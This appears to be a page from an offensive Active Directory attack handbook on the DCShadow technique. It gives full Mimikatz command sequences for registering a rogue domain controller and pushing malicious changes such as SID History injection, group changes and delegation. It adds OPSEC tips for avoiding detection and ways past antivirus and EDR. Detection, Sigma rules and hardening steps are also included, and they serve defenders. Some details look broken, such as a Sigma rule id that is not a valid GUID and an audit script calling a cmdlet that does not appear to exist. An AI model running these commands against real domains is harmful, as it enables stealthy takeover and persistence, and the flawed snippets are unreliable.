---
title: "Attack #38 — DCShadow Attack"
description: "DCShadow allows an attacker to register a rogue Domain Controller in Active Directory and push malicious changes via the legitimate replication protocol…"
category: active-directory
tags: ["active-directory", "credential-access"]
tools: ["Impacket", "Mimikatz", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Five/🔵 Attack #38 — DCShadow Attack.md"
---
# 🔵 Attack #38 — DCShadow Attack

***

## 📖 How It Works

DCShadow allows an attacker to **register a rogue Domain Controller** in Active Directory and push malicious changes via the legitimate replication protocol. Unlike DCSync (which reads), DCShadow **writes** — it can modify any AD object (add users to groups, set SPNs, modify ACLs, inject SID History) while bypassing most security logs because changes appear as normal DC replication.

The attack was presented at [BlueHat IL 2018](https://www.dcshadow.com/) by Benjamin Delpy (Mimikatz author) and Vincent Le Toux. It works by temporarily registering the attacker's machine as a Domain Controller in Active Directory by creating the required objects in the Configuration partition — specifically an `nTDSDSA` object under `CN=Servers,CN=<Site>,CN=Sites,CN=Configuration` and the corresponding SPN entries (`E3514235-4B06-11D1-AB04-00C04FC2DCD2/<hostname>` for [MS-DRSR](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/) replication, and `GC/<hostname>` for Global Catalog). Once registered, the rogue DC pushes changes via `DrsReplicaAdd` to force legitimate DCs to pull replication data from the attacker — the changes then propagate across the entire forest as normal multi-master replication.

> [!info]+ Technical Deep-Dive — nTDSDSA Registration & Replication Push
> `ris:FileList`
> 1. **Phase 1 — DC Registration**: The SYSTEM-context Mimikatz instance creates an `nTDSDSA` object under `CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=corp,DC=local` — this is the object that defines a machine as a Domain Controller
> 2. **SPNs Added**: Two critical SPNs are set on the attacker's computer object:
>    - `E3514235-4B06-11D1-AB04-00C04FC2DCD2/<attacker-hostname>/<domain>` (DRSUAPI replication SPN)
>    - `GC/<attacker-hostname>/<domain>` (Global Catalog SPN)
> 3. **Phase 2 — Change Injection**: The attacker stages the desired AD modifications (attribute changes) in a local NTDS-like structure
> 4. **Phase 3 — Replication Push**: The DA-context Mimikatz instance calls `DrsReplicaAdd` to notify real DCs that the rogue DC has changes to replicate, triggering the **Knowledge Consistency Checker (KCC)** to initiate inbound replication from the attacker
> 5. **Phase 4 — Cleanup**: After replication completes, the `nTDSDSA` object and SPNs are removed — the rogue DC registration is temporary (seconds to minutes)
> 6. *Because changes arrive via replication, they are stamped with a USN and `originating_dsa_invocation_id` — standard AD forensics tools see them as legitimate replication events*

### Key Difference: DCSync vs DCShadow

| Aspect | DCSync (Attack #37) | DCShadow |
|---|---|---|
| **Direction** | Read (pull credentials) | Write (push changes) |
| **Protocol Function** | `DRSGetNCChanges` (pull) | `DrsReplicaAdd` (push notification) |
| **Purpose** | Credential extraction | Persistence / stealthy modification |
| **Requirements** | Replication rights | Domain Admin + two Mimikatz instances |
| **Detection** | Event 4662 (well-documented) | Very difficult — appears as replication |
| **Artifacts** | Network only | Temporary nTDSDSA object + SPN changes |

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Domain Admin** | Required to register a rogue DC (create nTDSDSA object in Configuration partition) |
| **Two Mimikatz instances** | One as SYSTEM (RPC server for replication), one as DA (push trigger) |
| **Local admin on a domain-joined machine** | Machine will be temporarily registered as a DC in AD |
| **Network access to real DCs** | RPC replication ports (TCP 135 + dynamic) must be reachable in both directions |

***

## 🛠️ Tools

| Tool | Platform | Version | Notes |
|---|---|---|---|
| [Mimikatz](https://github.com/gentilkiwi/mimikatz) | Windows | ≥ 2.2.0 (Jan 2018+) | `lsadump::dcshadow` — the only full implementation |
| [SharpDCShadow](https://github.com/KevinJClark/SharpDCShadow) | Windows (.NET) | Proof-of-concept | .NET port for C2 `execute-assembly`; limited attribute support |
| [Set-DCShadowPermissions](https://github.com/samratashok/nishang) (Nishang) | Windows/PowerShell | Latest | Grants minimum DCShadow permissions to a non-DA user for persistence |
| [lsadump::dcshadow /stack](https://github.com/gentilkiwi/mimikatz) | Windows | ≥ 2.2.0 | Stack multiple attribute changes in a single replication push |

> [!tip]+ Tool Limitations
> `fas:Lightbulb`
> 1. DCShadow is **Mimikatz-only** in practice — no Impacket or Linux implementation exists because it requires running a local RPC server and registering the machine as a DC
> 2. The attack requires **two separate sessions** running simultaneously on the same machine — one elevated to SYSTEM, one with DA token
> 3. [SharpDCShadow](https://github.com/KevinJClark/SharpDCShadow) is a proof-of-concept with limited functionality — Mimikatz remains the authoritative implementation
> 4. *No remote execution possible — the attacker must have interactive/C2 access to the machine being registered as a rogue DC*

***

## ⏱️ Time-to-Execute Estimates

| Operation | Time | Notes |
|---|---|---|
| DC registration (nTDSDSA creation) | **5–15 seconds** | Depends on AD replication latency |
| Single attribute modification + push | **10–30 seconds** | Including registration, push, and cleanup |
| Multiple stacked changes (`/stack`) | **15–45 seconds** | Stack changes, single replication push |
| Full cleanup (nTDSDSA removal) | **5–10 seconds** | Automatic after `/push` completes |

***

## 💻 Full Commands

### 🔴 Basic DCShadow — Modify Single Attribute

```powershell
# ── Terminal 1: Run as SYSTEM — Start the rogue DC RPC server ────────────────
mimikatz.exe
privilege::debug
!+
!processtoken
lsadump::dcshadow /object:targetuser /attribute:primaryGroupID /value:512
# Registers machine as a temporary DC and prepares the change
# (primaryGroupID 512 = Domain Admins)

# ── Terminal 2: Run as DA — Push the replication ──────────────────────────────
mimikatz.exe
privilege::debug
lsadump::dcshadow /push
# Forces replication of the change to real DCs
```

### 🔴 Useful Attribute Modifications

```powershell
# ── Add SID History (stealthy privilege escalation) ──────────────────────────
# Terminal 1 (SYSTEM):
lsadump::dcshadow /object:targetuser /attribute:sidHistory /value:S-1-5-21-...-500
# Adds Enterprise Admin SID to sidHistory — user inherits EA privileges
# without being a member of the EA group

# ── Modify SPN (set up for Kerberoasting — Attack #2) ────────────────────────
# Terminal 1 (SYSTEM):
lsadump::dcshadow /object:targetuser /attribute:servicePrincipalName /value:MSSQLSvc/db01.corp.local:1433
# Makes the account Kerberoastable — request TGS and crack offline

# ── Set AdminCount (bypass AdminSDHolder protection) ──────────────────────────
# Terminal 1 (SYSTEM):
lsadump::dcshadow /object:targetuser /attribute:adminCount /value:1
# Marks user as admin — SDProp will apply AdminSDHolder DACL

# ── Modify userAccountControl (disable pre-auth for AS-REP roasting) ─────────
# Terminal 1 (SYSTEM):
lsadump::dcshadow /object:targetuser /attribute:userAccountControl /value:4194304
# Sets DONT_REQ_PREAUTH flag — enables AS-REP Roasting (Attack #3)

# ── Add member to group (e.g., add user to Domain Admins) ────────────────────
# Terminal 1 (SYSTEM):
lsadump::dcshadow /object:"CN=Domain Admins,CN=Users,DC=corp,DC=local" /attribute:member /value:"CN=targetuser,CN=Users,DC=corp,DC=local"

# ── Modify msDS-AllowedToDelegateTo (configure delegation) ───────────────────
# Terminal 1 (SYSTEM):
lsadump::dcshadow /object:svc_account /attribute:msDS-AllowedToDelegateTo /value:cifs/DC01.corp.local
# Sets constrained delegation → attacker can impersonate any user to cifs/DC01

# ALL of the above: Then run in Terminal 2 (DA):
# lsadump::dcshadow /push
```

### 🔴 Stacking Multiple Changes (Single Replication Push)

```powershell
# ── Terminal 1 (SYSTEM) — Stack multiple modifications ───────────────────────
lsadump::dcshadow /stack /object:targetuser /attribute:primaryGroupID /value:512
lsadump::dcshadow /stack /object:targetuser /attribute:sidHistory /value:S-1-5-21-...-519
lsadump::dcshadow /stack /object:targetuser /attribute:servicePrincipalName /value:fake/spn
# All three changes queued — pushed in a single replication cycle

# ── Terminal 2 (DA) — Push all stacked changes at once ───────────────────────
lsadump::dcshadow /push
# Single replication event containing all three modifications
```

### 🔴 Grant DCShadow Permissions to Non-DA User (Persistence)

```powershell
# ── Using Nishang Set-DCShadowPermissions ─────────────────────────────────────
Import-Module .\Set-DCShadowPermissions.ps1

# Grant minimum permissions for DCShadow to a low-priv user
Set-DCShadowPermissions -FakeDC YOURWORKSTATION -SamAccountName targetuser `
  -Username low_user -Verbose

# This grants:
# 1. Write access to nTDSDSA objects in the Configuration partition
# 2. Write access to the target computer object SPNs
# 3. Replication-related extended rights
# Now low_user can perform DCShadow without full DA privileges
```

### 🔵 Verify DCShadow Changes Took Effect

```powershell
# ── Check if primaryGroupID was changed ───────────────────────────────────────
Get-ADUser targetuser -Properties primaryGroupID, memberOf | Select-Object primaryGroupID, memberOf

# ── Check SID History ─────────────────────────────────────────────────────────
Get-ADUser targetuser -Properties sidHistory | Select-Object -ExpandProperty sidHistory

# ── Check replication metadata (which DC made the change) ─────────────────────
repadmin /showobjmeta DC01 "CN=targetuser,CN=Users,DC=corp,DC=local"
# Look for originating DSA that doesn't match a real DC = DCShadow indicator
```

***

## 🎯 OPSEC Tips

1. **DCShadow is the stealthiest AD modification technique** — changes arrive via the replication protocol and are indistinguishable from legitimate multi-master replication in most SIEM setups
2. **The nTDSDSA registration is temporary** — Mimikatz removes it after the push completes; if the tool crashes, manual cleanup is needed (`ntdsutil → metadata cleanup`)
3. **Changes bypass standard LDAP-based security logs** — Event IDs 4662/5136/5137 (directory service modification) are NOT generated because the change didn't come through LDAP; it came through replication
4. **Stack changes with `/stack`** to minimize the number of replication events — one push with 10 changes is stealthier than 10 separate pushes
5. **Use for persistence, not initial escalation** — you already need DA; DCShadow is for maintaining access and avoiding detection
6. **SID History injection is the most powerful DCShadow use case** — the user gets EA/DA privileges without group membership, which most auditing tools miss
7. **Time attacks during legitimate replication windows** — AD replicates every 15 minutes (intra-site) by default; pushing changes during expected replication windows reduces anomaly signals

### 📊 OpSec Ranking

| Modification Type | Stealth | Persistence Value | Detection Risk | Notes |
|---|---|---|---|---|
| SID History injection | 🟢 High | 🟢 High | 🟢 Low | Most tools don't audit sidHistory changes via replication |
| primaryGroupID change | 🟡 Medium | 🟡 Medium | 🟡 Medium | Group membership changes may trigger membership audits |
| SPN modification | 🟢 High | 🟡 Medium | 🟢 Low | Enables Kerberoasting; SPN changes rarely monitored |
| userAccountControl | 🟡 Medium | 🟡 Medium | 🟡 Medium | Disabling pre-auth is suspicious if audited |
| Direct group member add | 🔴 Low | 🟢 High | 🔴 High | Most orgs monitor DA/EA group membership |
| msDS-AllowedToDelegateTo | 🟢 High | 🟢 High | 🟢 Low | Constrained delegation rarely audited |

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4742** | Security Log (DC) | Computer account modified — `nTDSDSA` object created (rogue DC registration) |
| **4928/4929** | Security Log (DC) | Active Directory Replica Source Naming Context established/removed — rogue DC participating in replication |
| **4662** | Security Log (DC) | DS Access on Configuration partition objects (nTDSDSA creation) — requires DS Access auditing |
| **Metadata** | Replication | Changes originating from a non-DC source — check `repadmin /showmeta` for unknown `originating_dsa_invocation_id` |

> [!important]+ The Key Detection Challenge
> `fas:TriangleExclamation`
> 1. DCShadow changes **do NOT generate standard modification events** (5136/5137) because they arrive via replication, not LDAP
> 2. The primary detection vector is monitoring the **Configuration partition** for new `nTDSDSA` objects and SPN changes on computer accounts
> 3. Network-level detection (monitoring for `DrsReplicaAdd` RPC calls from non-DC IPs) is the most reliable method
> 4. *If your SIEM only monitors Security logs on DCs, DCShadow changes will be completely invisible*

### 🔎 Sigma Rules

```yaml
# ── SigmaHQ — DCShadow (nTDSDSA Object Creation) ────────────────────────────
title: DCShadow — Rogue Domain Controller Registration
id: f3b4c644-4e5d-4e8f-9c3a-84f5c2c07e5c
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4742
  keywords:
    - 'nTDSDSA'
    - 'E3514235-4B06-11D1-AB04-00C04FC2DCD2'
  condition: selection and keywords
level: critical
tags:
  - attack.defense_evasion
  - attack.t1207
```

```yaml
# ── SigmaHQ — Replication Source Added from Non-DC ───────────────────────────
title: Active Directory Replication from Non-DC Source
id: a1b2c3d4-rogue-dc-replication-monitor
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID:
      - 4928
      - 4929
  condition: selection
level: high
tags:
  - attack.defense_evasion
  - attack.t1207
```

### 🛡️ EDR-Specific Detections

> [!warning]+ Microsoft Defender for Identity (MDI)
> `ris:Windows`
> 1. **"Suspected DCShadow attack (domain controller promotion)"** — detects when a non-DC machine registers itself as a Domain Controller
> 2. **"Suspected DCShadow attack (domain controller replication request)"** — detects `DrsReplicaAdd` calls from non-DC machines
> 3. MDI monitors the Configuration partition in real-time for nTDSDSA object creation
> 4. *MDI is the most reliable DCShadow detection tool available — it has specific behavioral detections that SIEM rules alone cannot replicate*

> [!warning]+ CrowdStrike Falcon
> `ris:Radar`
> 1. **"DCShadow Activity Detected"** — monitors for Mimikatz `lsadump::dcshadow` behavioral patterns
> 2. Falcon detects the combination of SYSTEM token manipulation (`!processtoken`) + DRSUAPI RPC server registration
> 3. Process tree analysis flags the dual-Mimikatz pattern (two `mimikatz.exe` instances with different token contexts)

> [!warning]+ Elastic Security
> `ris:FileList`
> 1. Rule: **"Potential DCShadow Activity"** — monitors for nTDSDSA object creation events and SPN modifications containing the DRSUAPI UUID
> 2. Rule: **"Active Directory Replication from Anomalous Source"** — correlates replication traffic source IPs against known DC list
> 3. *Requires Windows Event Forwarding (WEF) of Configuration partition change events to Elasticsearch*

***

## 🔬 Forensic Artifacts

| Artifact | Location | Details |
|---|---|---|
| **nTDSDSA object (transient)** | `CN=Servers,CN=<Site>,CN=Sites,CN=Configuration` | Created during attack, removed after `/push` — may be captured in AD snapshots or tombstoned objects |
| **SPN modifications** | Computer object in AD | `E3514235-4B06-11D1-AB04-00C04FC2DCD2/<hostname>` SPN temporarily added; check `msDS-ReplAttributeMetaData` for modification timestamps |
| **Replication metadata** | `repadmin /showmeta` on modified objects | `originating_dsa_invocation_id` will reference the rogue DC's invocation ID — this ID won't match any real DC |
| **Event 4742** | DC Security Log | Computer account modification for SPN changes; look for DRSUAPI-related SPNs being added then quickly removed |
| **Event 4928/4929** | DC Security Log | Replication source naming context established from non-DC — definitive DCShadow indicator if captured |
| **USN journal** | NTDS.dit `msDS-ReplAttributeMetaData` | Each replicated change has a USN with the originating DC — unknown DC = DCShadow |
| **Tombstone objects** | AD Recycle Bin | If enabled, the deleted nTDSDSA object may be recoverable for 180 days (default tombstone lifetime) |

***

> [!important]+ Windows Server Version Differences
> `ris:Windows`
> 1. **Server 2012 R2**: DCShadow works without additional obstacles; minimal replication monitoring by default
> 2. **Server 2016+**: Windows Defender Credential Guard does NOT prevent DCShadow (it doesn't interact with LSASS or local credentials)
> 3. **Server 2019**: No new DCShadow-specific mitigations; MDI deployment is the primary recommendation
> 4. **Server 2022**: Microsoft added enhanced replication logging capabilities, but they require explicit configuration
> 5. **Server 2025**: Improved Configuration partition change auditing — `nTDSDSA` object creation generates additional telemetry when Advanced Audit Policy is configured
> 6. *DCShadow remains effective on all Windows Server versions — the mitigation is monitoring, not a technical patch*

***

## 🔒 Hardening & Prevention

```powershell
# ── 1. Monitor Configuration partition for nTDSDSA object changes ─────────────
# Enable auditing on the Sites container in Configuration partition
$sitesPath = "AD:CN=Sites,CN=Configuration,DC=corp,DC=local"
$acl = Get-Acl $sitesPath
# Add SACL for Write access → generates Event 4662 on nTDSDSA creation

# ── 2. Enable Advanced Audit Policy — DS Access ──────────────────────────────
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
auditpol /set /subcategory:"Detailed Directory Service Replication" /success:enable

# ── 3. Monitor SPN changes on computer accounts ──────────────────────────────
# GPO → Computer Configuration → Windows Settings → Security Settings →
# Advanced Audit Policy Configuration → DS Access →
#   ✅ Audit Directory Service Changes: Success
# Alert on SPNs containing "E3514235-4B06-11D1-AB04-00C04FC2DCD2" being added to non-DC accounts

# ── 4. Deploy MDI sensors on ALL Domain Controllers ──────────────────────────
# MDI is the single most effective DCShadow detection tool
# https://learn.microsoft.com/en-us/defender-for-identity/

# ── 5. Restrict who can modify the Configuration partition ────────────────────
# By default, only Enterprise Admins and Domain Admins can create objects here
# Audit and minimize membership in these groups

# ── 6. Enable AD Recycle Bin (capture deleted nTDSDSA objects) ────────────────
Enable-ADOptionalFeature -Identity 'CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=corp,DC=local' `
  -Scope ForestOrConfigurationSet -Target 'corp.local' -Confirm:$false

# ── 7. Regularly audit replication metadata ───────────────────────────────────
# Script to check for unknown originating DSAs across all user objects:
$dcs = (Get-ADDomainController -Filter *).Name
Get-ADUser -Filter * -Properties msDS-ReplAttributeMetaData |
  ForEach-Object {
    $meta = $_.'msDS-ReplAttributeMetaData' | ConvertFrom-ADMetadata
    $meta | Where-Object { $_.LastOriginatingDsaDN -notmatch ($dcs -join '|') }
  }

# ── 8. Network-level replication monitoring ───────────────────────────────────
# Deploy Zeek/Bro or network TAP to monitor DRSUAPI traffic
# Alert on DrsReplicaAdd calls from non-DC IP addresses
```

***

## 🧩 Troubleshooting

| Error | Cause | Fix |
|---|---|---|
| `ERROR kuhl_m_lsadump_dcshadow_domain_info` | Cannot find domain information; machine may not be domain-joined | Verify machine is domain-joined (`systeminfo \| findstr Domain`); ensure DNS resolves the DC FQDN |
| Terminal 1 hangs on "RPC server waiting" | Firewall blocking inbound RPC on the attacker machine | Ensure Windows Firewall allows inbound TCP 135 + dynamic RPC ports on the machine running Terminal 1 |
| `/push` returns "Error 0x2105" (ACCESS_DENIED) | Terminal 2 is not running as DA or the token is wrong | Verify DA token: `whoami /groups` should show Domain Admins; use `token::elevate /domainadmin` if needed |
| Changes don't appear on other DCs | Replication push succeeded to one DC but inter-site replication is slow | Run `repadmin /syncall /AeD` on the target DC to force replication to all partners |
| nTDSDSA object not cleaned up | Mimikatz crashed before cleanup; rogue DC still registered | Manual cleanup: `ntdsutil → metadata cleanup → remove selected server`; or delete the object via ADSIEdit |
| "SYSTEM token required" error | Terminal 1 not running as SYSTEM (`!+` / `!processtoken` failed) | Use `psexec -s -i cmd.exe` to get a SYSTEM shell, then run Mimikatz from there |
| SID History injection fails | Target account has adminCount=1 (SDProp resets the ACL) | Modify sidHistory on non-protected accounts, or clear adminCount first via a separate DCShadow push |
| AV/EDR blocks Mimikatz execution | Defender or EDR detects mimikatz.exe on disk | Use reflective PE loading (e.g., `Invoke-Mimikatz`), packed variants, or execute from C2 via `execute-assembly` with SharpDCShadow |

***

## 🗺️ MITRE ATT&CK

| Tactic | Technique ID | Sub-technique | Procedure | APT Groups |
|---|---|---|---|---|
| **Defense Evasion** | [T1207](https://attack.mitre.org/techniques/T1207/) | Rogue Domain Controller | Register rogue DC via nTDSDSA, push malicious replication changes that bypass standard logging | Technique is public since 2018; no specific APT attribution yet |
| **Persistence** | [T1098](https://attack.mitre.org/techniques/T1098/) | Account Manipulation | Inject SID History, modify group membership, or change delegation settings via replication | Red team operations and advanced persistent threats |
| **Privilege Escalation** | [T1134](https://attack.mitre.org/techniques/T1134/) | [.005 — SID-History Injection](https://attack.mitre.org/techniques/T1134/005/) | Use DCShadow to inject Enterprise Admin SID into a low-priv user's sidHistory attribute | Demonstrated in red team operations |

> [!tip]+ Real-World Context
> `fas:Lightbulb`
> 1. DCShadow is primarily a **red team / advanced attacker technique** — it requires DA access, making it a persistence/defense evasion tool rather than an escalation vector
> 2. No public APT attribution exists as of 2025, but the technique is available to any adversary with DA-level access
> 3. **Purple team value**: DCShadow is an excellent test for validating MDI deployment and replication monitoring capabilities
> 4. *The fact that DCShadow has no public APT usage doesn't mean it's not used — it means it's difficult to detect and attribute*

***

## 🔗 Attack Chain Context

```
[DCShadow] ──→ Stealthy AD Modifications via Fake DC Replication
         │
         ├──→ 📝 Push changes that appear as legitimate replication
         ├──→ 🔗 Requires DA → used for persistence, not initial escalation
         ├──→ 🔐 SID History injection → invisible privilege escalation (Attack #65)
         ├──→ 🎯 SPN modification → set up Kerberoasting (Attack #2)
         ├──→ 🔓 Disable pre-auth → set up AS-REP Roasting (Attack #3)
         ├──→ 🔄 Related: DCSync (Attack #37) reads; DCShadow writes
         ├──→ 📋 Delegation abuse via msDS-AllowedToDelegateTo (Attack #16)
         ├──→ 💻 Requires Mimikatz on a domain-joined workstation
         └──→ 💀 Defeated by: MDI, monitor Configuration partition, replication metadata auditing, AD Recycle Bin
```

***

> ✅ **Attack #38 — DCShadow complete.**
